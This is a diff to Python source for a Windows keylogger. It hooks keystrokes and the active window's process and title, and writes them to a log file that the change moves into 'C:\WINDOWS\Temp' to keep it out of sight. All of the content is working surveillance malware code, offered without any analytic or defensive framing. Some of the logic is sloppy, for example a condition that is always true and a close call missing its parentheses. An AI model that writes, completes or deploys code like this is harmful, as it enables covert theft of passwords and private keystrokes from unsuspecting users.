@@ -34,7 +34,8 @@ def get_current_process():
     window_title = create_string_buffer("\x00" * 512)
     length = user32.GetWindowTextA(hwnd, byref(window_title),512)
     
-    f=open('c:\oxn.txt','a')
+    f=open('c:\\WINDOWS\\Temp\\xm.txt','a')
+    f.write("'\n'")
     f.write ("[ PID: %s - %s - %s ]'\n'" % (process_id, executable.value, window_title.value))
     f.close
   
@@ -55,12 +56,12 @@ def KeyStroke(event):
     if event.Ascii==5:
         _exit(1)
     if event.Ascii !=0 or 8:
-        f=open('c:\oxn.txt','a')
+        f=open('c:\\WINDOWS\\Temp\\xm.txt','a')
         f.close()
-        f=open('c:\oxn.txt','r+')
+        f=open('c:\\WINDOWS\\Temp\\xm.txt','r')
         buffer=f.read()
         f.close()
-        f=open('c:\oxn.txt','w')
+        f=open('c:\\WINDOWS\\Temp\\xm.txt','w')
         keylogs=chr(event.Ascii)
         if event.Ascii==13:
             keylogs='/n'
